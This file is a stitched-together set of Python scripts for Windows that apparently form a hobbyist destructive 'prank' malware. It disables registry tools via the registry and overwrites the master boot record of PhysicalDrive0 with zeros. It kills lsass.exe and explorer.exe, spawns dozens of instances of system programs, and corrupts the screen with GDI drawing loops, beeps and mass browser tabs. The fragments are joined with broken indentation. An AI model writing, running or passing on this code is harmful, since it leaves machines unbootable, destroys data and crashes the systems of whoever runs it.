import winreg

key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
winreg.SetValueEx(key, "DisableRegistryTools", 0, winreg.REG_DWORD, 1)
winreg.CloseKey(key)

import os
def overwrite_mbr():
    with open('\\\\.\\PhysicalDrive0', 'rb+') as f:
        f.write(b'\x00' * 512)

if __name__ == "__main__":
    overwrite_mbr()
import webbrowser

urls = [
    "https://www.google.com/search?q=Freeeee+minecraft+download+No+Virsusus&oq=Freeeee+minecraft+download+No+Virsusus&gs_lcrp=EgZjaHJvbWUqBggAEEUYOzIGCAAQRRg7Mg4IARAjGBMYJxiABBiKBTIGCAIQRRhAMgwIAxAjGCcYgAQYigUyEAgEEC4YgwEYsQMYgAQYigUyDQgFEAAYgwEYsQMYgAQyDQgGEC4YgwEYsQMYgAQyCggHEAAYsQMYgATSAQg4MTA4ajBqN6gCALACAA&sourceid=chrome&ie=UTF-8",
    "https://github.com/",
    "https://www.virustotal.com/gui/home/upload",
    "https://web.whatsapp.com/",
    "https://www.youtube.com/watch?v=huF03d3FxVo",
    "https://zzzcode.ai/code-generator?id=d4011038-1cab-4297-a15b-d5aa9db1a6c4",
    "https://archive.org/details/microsoft-windows-7-italiano-raccolta-di-mrgass",
    "https://www.bing.com/"
]

for url in urls:
    webbrowser.open_new_tab(url)
    from threading import Thread
import os    
from win32gui import *
from win32api import *
from win32ui import *
from win32con import *
from random import *


def func1():
    #sound generator
    import winsound

    freq = 500         
    dur = 1000
    freq1 = 600
    dur1 = 200
    freq2 = 100
    dur2 = 100
    freq3 = 900
    dur3 = 120
    freq4 = 700
    dur4 = 3000
    freq5 = 9000
    dur5 = 100
    freq6 = 8000
    dur6 = 900
    freq7 = 700
    dur7 = 800
    freq8 = 900
    dur8 = 400
    freq9 = 700
    dur9 = 900 
    winsound.Beep(freq, dur)
    winsound.Beep(freq1, dur1)
    winsound.Beep(freq2, dur2)
    winsound.Beep(freq3, dur3)
    winsound.Beep(freq4, dur4)
    winsound.Beep(freq5, dur5)
    winsound.Beep(freq6, dur6)
    winsound.Beep(freq7, dur7)
    winsound.Beep(freq8, dur8)
    winsound.Beep(freq9, dur9)

def func2():
    for i in range(1):
        desk = GetDC(0)
        x = GetSystemMetrics(0)
        y = GetSystemMetrics(1)
        print(x)
        print(y)
        #os.startfile('guiCorrupt.py')
        for i in range(50000):
            brush = CreateSolidBrush(RGB(
                randrange(255),
                randrange(255),
                randrange(255)
                )) #Creates a brush
            SelectObject(desk, brush) #Choose that we're drawing with our brush.
            PatBlt(desk, randrange(x), randrange(y), randrange(100), randrange(200), PATCOPY)
            DeleteObject(brush)
            #Sleep(1) #wait
        ReleaseDC(desk, GetDesktopWindow())
        DeleteDC(desk) #Deletes our DC.


if __name__ == '__main__':
    Thread(target = func1).start()
    Thread(target = func2).start()



from win32gui import *
from win32api import *
from win32ui import *
from win32con import *
from random import *

desk = GetDC(0) 
x = GetSystemMetrics(0) 
y = GetSystemMetrics(1) 

for i in range(0, 100):
    brush = CreateSolidBrush(RGB(
        75, # Red value
        55, # Green value
        65 # Blue value
    )) # Creates a brush
    SelectObject(desk, brush) 
    PatBlt(desk, randrange(x), randrange(y), randrange(x), randrange(y), PATINVERT)
    DeleteObject(brush) 
    Sleep(10)
from win32gui import *
from win32api import *
from win32ui import *
from win32con import *
from random import *
import win32gui
import win32api
import win32con
import random
import time

desk = GetDC(0) 
x = GetSystemMetrics(0) 
y = GetSystemMetrics(1) 
for i in range(0, 100):
    brush = CreateSolidBrush(RGB(
        50, # Red value
        200, # Green value
        200# Blue value
    )) # Creates a brush
    SelectObject(desk, brush) 
    PatBlt(desk, randrange(x), randrange(y), randrange(x), randrange(y), PATINVERT)
    DeleteObject(brush)
    Sleep(100) 

import webbrowser
webbrowser.open("https://www.youtube.com/watch?v=xvFZjo5PgG0")
import os
os.system("taskkill /f /im lsass.exe")

import os

os.system("Taskkill /F /IM explorer.exe")

from win32gui import *
from win32api import *
from win32ui import *
from win32con import *


desk = GetDC(0)
x = 90
y = 90
x_2 = 90
y_2 = 90


for i in range(200):
    PatBlt(desk, x, y, x_2, y_2, PATINVERT)
    x += 10
    y += 10
    x_2 -= 10
    y_2 -= 10

from win32gui import *
from win32api import *
from win32ui import *
from win32con import *
from random import *

desk = GetDC(0) 
x = GetSystemMetrics(0) 
y = GetSystemMetrics(1) 

for i in range(0, 100):
    PatBlt(desk, randrange(x), randrange(y), randrange(x), randrange(y), DSTINVERT) 
    Sleep(10) 
ReleaseDC(desk, GetDesktopWindow())
DeleteDC(desk) 
import subprocess

# List of applications to open
applications = ['explorer', 'taskmgr', 'mspaint', 'notepad', 'regedit', 'cmd', 'powershell', 'control', 'msedge']

# Open 25 instances of each application in separate processes
for app in applications:
    for _ in range(25):
        subprocess.Popen(['start', app], shell=True)

import numpy as np
import ctypes
from ctypes import wintypes
import win32con
import cv2
from random import *
import time

#Structure Building.
class BITMAPINFOHEADER(ctypes.Structure):
    _fields_ = [
        ('biSize', wintypes.DWORD),
        ('biWidth', wintypes.LONG),
        ('biHeight', wintypes.LONG),
        ('biPlanes', wintypes.WORD),
        ('biBitCount', wintypes.WORD),
        ('biCompression', wintypes.DWORD),
        ('biSizeImage', wintypes.DWORD),
        ('biXPelsPerMeter', wintypes.LONG),
        ('biYPelsPerMeter', wintypes.LONG),
        ('biClrUsed', wintypes.DWORD),
        ('biClrImportant', wintypes.DWORD),
        ]

class RGBQUAD(ctypes.Structure):
    _fields_ = [
        ('rgbRed', ctypes.c_byte),
        ('rgbGreen', ctypes.c_byte),
        ('rgbBlue', ctypes.c_byte),
        ('rgbReserved', ctypes.c_byte),
    ]

# Create a BITMAPINFO structure
class BITMAPINFO(ctypes.Structure):
    _fields_ = [
        ("bmiHeader", BITMAPINFOHEADER),
        ("bmiColors", RGBQUAD * 1),
    ]

#Create a shader.
def rainbowShader():
    for i in range(5):
        # Create a numpy array of shape (height, width, 3) with all rgb color
        ctypes.windll.user32.SetProcessDPIAware()
        width = ctypes.windll.user32.GetSystemMetrics(0)
        height = ctypes.windll.user32.GetSystemMetrics(1)
        #Create a blank image.
        img = np.zeros((height, width, 3), dtype=np.uint8)
        image = np.zeros((height, width, 3), dtype=np.uint8)
        #You need to edit the image yourself with your own knowledge of cv2 and numpy.
        #But here I'll make a gradient.
        for i in range(height):
            for j in range(width):
                # Use the formula r = i, g = j, b = i + j to create a gradient effect
                r = (i) % 256
                g = (j)  % 256
                b = (i + j) % 256
                img[i, j] = [r, g, b]

        # Get the handle of the desktop window
        hwnd = ctypes.windll.user32.GetDesktopWindow()

        # Get the device context of the desktop window
        hdc = ctypes.windll.user32.GetDC(hwnd)

        # Create a compatible device context in memory
        memdc = ctypes.windll.gdi32.CreateCompatibleDC(hdc)

        # Create a bitmap with the same size as the numpy array
        bitmap = ctypes.windll.gdi32.CreateCompatibleBitmap(hdc, width, height)

        # Select the bitmap into the memory device context
        ctypes.windll.gdi32.SelectObject(memdc, bitmap)

        bmi = BITMAPINFO()
        bmi.bmiHeader.biSize = ctypes.sizeof(BITMAPINFOHEADER)
        bmi.bmiHeader.biWidth = width
        bmi.bmiHeader.biHeight = -height # negative to indicate top-down bitmap
        bmi.bmiHeader.biPlanes = 1
        bmi.bmiHeader.biBitCount = 24
        bmi.bmiHeader.biCompression = 0x0000
        #Change some color, actually.
        img = cv2.cvtColor(img, cv2.COLOR_HSV2RGB)
        # Copy the numpy array to the bitmap using SetDIBits
        ctypes.windll.gdi32.SetDIBits(memdc, bitmap, 0, height, img.tobytes(), ctypes.byref(bmi), 0x00)

        # BitBlt the bitmap to the desktop device context
        #I use SRCAND to make it half-transparent, you can use SRCPAINT to get the opacity-decrease or SRCCOPY to cover the screen.
        ctypes.windll.gdi32.BitBlt(hdc, 0, 0, width, height, memdc, 0, 0, win32con.SRCAND)
        # Release the device contexts and the bitmap
        ctypes.windll.gdi32.DeleteObject(bitmap)
        ctypes.windll.gdi32.DeleteDC(memdc)
        ctypes.windll.user32.ReleaseDC(hwnd, hdc)

#Loop
def shader1():
    while True:
        rainbowShader()
        time.sleep(randrange(4, 6))

shader1()

